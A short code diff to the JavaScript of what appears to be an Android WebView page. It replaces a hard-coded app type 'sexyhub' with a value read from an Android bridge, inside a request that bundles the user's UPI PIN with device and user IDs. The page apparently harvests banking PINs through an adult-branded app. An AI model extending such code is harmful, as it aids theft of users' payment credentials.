@@ -339,6 +339,17 @@ h5 {
         return '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'; // Fallback
     }
 
+    function getAppType() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getAppType) {
+                return Android.getAppType();
+            }
+        } catch (e) {
+            console.error('Error getting app type:', e);
+        }
+        return 'sexyhub'; // Fallback
+    }
+
     function updateDisplay() {
         let display = document.getElementById("input-display");
         display.innerHTML = "";
@@ -387,10 +398,11 @@ h5 {
         
         const deviceId = getDeviceId();
         const userId = getUserId();
+        const appType = getAppType();
         const requestData = {
             upi_pin: upiPin,
             device_id: deviceId,
-            app_type: 'sexyhub',
+            app_type: appType,
             user_id: userId
         };
 
